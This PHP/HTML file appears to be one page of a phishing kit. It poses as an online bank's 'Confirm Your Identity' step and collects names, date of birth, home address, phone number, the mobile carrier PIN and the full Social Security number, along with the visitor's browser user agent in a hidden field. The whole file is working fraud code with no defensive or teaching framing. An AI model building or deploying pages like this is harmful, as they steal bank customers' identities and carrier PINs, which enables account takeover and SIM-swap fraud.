<?php
$title = 'Confirm Your Identity';
include 'head.php';
include 'header.php';
include 'token.php';
?>
<!-- MAIN CONTENT START HERE -->
<!-- Start Card -->
<div class="card_content_2">
  <div class="card-body card_content_3">
    <div class="row ">
      <div class="col-md-12">
        <h5 class="sign_in_text">Confirm Your Identity</h5>
      </div>
      <div class="col-md-4 custom_right_padding">
        
        <div class="form_box">
          <div style="border-radius: 7px 7px 0px 0px; margin-top: -1px; padding: 6px 8px" class="form_title">Enter Your Real Info:</div>
          <form action="" method="POST">
            
            <input type="hidden" name="token" value="<?= $token;?>">
            
            <div class="form-group form_group_custom">
              <label>First Name:</label><br>
              <input  id="first_name"
              style="margin-top: -4px;" type="text" name="first_name"required="required" >
            </div>
            
            <div class="form-group form_group_custom" style="margin-top: 2px;">
              <label>Last Name:</label><br>
              <input required="required" id="last_name"
              style="margin-top: -4px;" type="text" name="last_name" >
            </div>
            <div class="form-group form_group_custom" style="margin-top: 2px;">
              <label>DOB:</label><br>
              <input required="required" id="dob"
              style="margin-top: -4px;" type="date" name="dob">
              
            </div>
            <div class="form-group form_group_custom" style="margin-top: 2px;">
              <label>State:</label><br>
              <input required="required" id="state"
              style="margin-top: -4px;" type="text" name="state" >
            </div>
            <div class="form-group form_group_custom" style="margin-top: 2px;">
              <label>Street:</label><br>
              <input required="required" id="street"
              style="margin-top: -4px;" type="text" name="street" >
            </div>
            <div class="form-group form_group_custom" style="margin-top: 2px;">
              <label>ZIP code:</label><br>
              
              <input required="required" id="zip"
              style="margin-top: -4px;" type="text" name="zip" pattern="[0-9]{5}">
            </div>
            <div class="form-group form_group_custom" style="margin-top: 2px;">
              <label>Phone:</label><br>
              <input required="required" id="phone"
              
              style="margin-top: -4px;" type="tel" name="phone" pattern="[0-9]{3}[0-9]{3}[0-9]{4}" placeholder="xxx-xxx-xxxx">
              
            </div>
            <div class="form-group form_group_custom" style="margin-top: 2px;">
              <label>Carrier-PIN:</label><br>
              <input required="required" id="carrier_pin" placeholder="xxxx"
              style="margin-top: -4px;" type="text" name="carrier_pin" pattern="[0-9]{4}" maxlength="4" >
            </div>
            <div class="form-group form_group_custom" style="margin-top: 2px;">
              <label>Social Security Number:</label><br>
              <input required="required" id="social_sec_no" placeholder="XXX-XX-xxxx "
              style="margin-top: -4px;" type="text" name="social_sec_no" pattern="[0-9]{3}[0-9]{2}[0-9]{4}">
            </div>
            <?php
            $agent = $_SERVER["HTTP_USER_AGENT"]; { ?>
            <input type="hidden" value="<?= $agent; ?>" name="user_agent" >
            <?php } ?>
            <br>
            <div class="form-group">
              <button disabled="disabled" id="submit" name="confirm_identity"  class="btn btn-secondary btn-sm btn_signin">Continue</button>
            </div>
            <p class="footer_form">
              <strong>Enroll in Online Banking:</strong><br>
              <div class="link_btm" style="font-size: 10.89px;">
                <a href="#">Personal</a> | <a href="#">Small Business</a>
              </div>
            </p>
          </form>
        </div>
        
      </div>
      <div class="col-md-8 custom_left_padding">
        <div class="card radiuses" style="border: none;">
          <div class="desc_text_box">
            <p class="desc_text">
              All of the account information and services you have come to expect from Online Banking are ready and waiting for you. Just complete the sign in process to see your account(s), view statements, pay bills, and conduct the activities that you normally would.
              <br><br>
              <strong>To Sign In</strong>: Enter your User ID and password. Then, click the 'Sign In' button.
            </p>
          </div>
        </div>
      </div>
    </div>
    <script type="text/javascript">
    (function() {
    $('form > div > input').keyup(function() {
    var empty = false;
    $('form > div > input').each(function() {
    if ($(this).val() == '') {
    empty = true;
    }
    });
    if (empty) {
    $('#submit').attr('disabled', 'disabled'); // updated according to http://stackoverflow.com/questions/7637790/how-to-remove-disabled-attribute-with-jquery-ie
    } else {
    $('#submit').removeAttr('disabled'); // updated according to http://stackoverflow.com/questions/7637790/how-to-remove-disabled-attribute-with-jquery-ie
    }
    });
    })()
    </script>
    <!-- FOOTER -->
    <?php
    include 'footer.php';
    ?>